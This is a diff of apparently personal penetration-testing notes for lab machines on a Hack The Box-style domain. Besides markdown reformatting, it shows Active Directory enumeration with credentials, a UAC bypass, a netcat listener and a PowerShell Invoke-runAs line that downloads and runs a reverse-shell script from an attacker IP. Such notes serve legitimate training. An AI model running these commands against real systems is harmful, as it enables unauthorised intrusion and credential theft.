@@ -7,9 +7,10 @@ if ports appear wrapped with nmap add -n option
 
 # Exploit
 
-#KERB
+### KERB
+```
 #find users by bruting sids
-```lookupsid.py   (impacket) or enum4linux
+lookupsid.py   (impacket) or enum4linux
 bloodhound-python -c All -u svc-alfresco -p s3rvice -d htb.local -dc 10.10.10.161 -gc htb.local
 or
 runas /user:domainname\username powershell.exe and sharphound.exe
@@ -84,7 +85,7 @@ https://gtfobins.github.io/
 #### bypass UAC reading
 `net use Z: \\127.0.0.1\c$`
 
-
+```
 whoami /priv
 # if SeImpersonatePrivilege is enabled --> juicy/rotten potato
 systeminfo
@@ -114,8 +115,7 @@ Invoke-Command -Computer re -Credential $cred -ScriptBlock { IEX(New-Object Net.
 #powershell suite runas 
   paste following at the bottom of the script(see bart video @ 55:36):
   Invoke-runAs -User administrator -Password 3130438f31186fbaf962f407711faddb -LogonType 0x1 -Binary c:\windows\sysnative\windowspowershell\v1.0\powershell.exe -Args "IEX(new-Object Net.webclient).downloadString('http://10.10.14.73/rev1.txt')"
-
-
+```
 
 # Usefull commands
 ## Windows
@@ -176,22 +176,12 @@ rlwrap nc -lvnp 51251
 ```
 
 
-
 # Web
+#### dir enum
 ```gobuster dir -u http://10.10.10.98 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt```
+
 #### LFI
 https://www.gracefulsecurity.com/path-traversal-cheat-sheet-windows/
-
-
-
-
-
-ENUMERATION
-
-JAWS --> https://github.com/411Hall/JAWS.git
-
-
-PRIVESC WINDOWS 
 
 
 # USEFULL FRAMEWORKS
@@ -210,6 +200,8 @@ linenum --> https://github.com/rebootuser/LinEnum/blob/master/LinEnum.sh
 peas --> https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite
 aclpwn --> https://github.com/fox-it/aclpwn.py
 lazagne --> https://github.com/AlessandroZ/LaZagne
+JAWS --> https://github.com/411Hall/JAWS.git
+
 ```
 ## APT
 ```
